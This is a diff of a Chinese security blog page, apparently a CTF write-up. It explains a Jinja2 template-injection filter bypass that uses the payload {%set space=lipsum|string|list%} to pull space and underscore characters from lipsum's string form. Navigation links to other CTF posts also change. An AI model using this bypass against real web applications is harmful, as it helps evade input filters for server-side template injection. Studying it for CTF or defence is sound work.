+<p>由于lipsum是内置函数，所以它会显示这些，函数名在哪个地址下，而中间的字符串在经过<code>&#123;%set space=lipsum|string|list%&#125;</code>处理后（先将其以字符串的形式保存，然后再以列表的形式保存）就会变成这个样子</p>
+<p><img src="image-20241104203355103.png" alt="image-20241104203355103"></p>
+<p>自己数一下就会发现空格就在下标9的上面，下划线就在下标18的上面</p>
+</blockquote>
 
       </section>
 
@@ -211,8 +227,8 @@
     
     <div class="card-text">
       
-        <a href="/2024/10/31/ssti-labs/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">ssti-labs</h2>
+        <a href="/2024/11/13/DSBCTF/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">DSBCTF复现</h2>
         </a>
       
       <div class="card-text--row">Newer</div>
@@ -226,8 +242,8 @@
     
     <div class="card-text">
       
-        <a href="/2024/09/02/XGCTF/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">XGCTF</h2>
+        <a href="/2024/10/23/upload-labs/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">upload-labs</h2>
         </a>
       
       <div class="card-text--row">Older</div>
